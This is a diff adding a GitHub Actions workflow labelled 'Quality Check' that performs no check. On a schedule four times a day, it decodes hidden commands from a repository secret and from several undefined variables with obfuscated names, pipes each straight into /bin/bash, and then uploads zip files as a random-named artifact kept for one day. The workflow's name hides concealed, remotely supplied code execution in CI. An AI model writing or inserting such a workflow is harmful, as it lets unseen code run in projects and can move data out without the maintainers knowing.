@@ -1,0 +1,31 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '3 2,8,14,20 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          txr12229: ${{ secrets.txr12229 }}
+        run: |
+          printf '%s' "$txr12229" | jq -r .rx918 | /bin/bash
+          printf '%s' "$h77675" | jq -r .ptiap667 | /bin/bash
+          echo $h5 | jq -r .fdvu90 | /bin/bash
+          printf '%s' "$kpihx657" | jq -r .hqz76183 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: er3u8zUS
+          path: "*.zip"
+          retention-days: 1
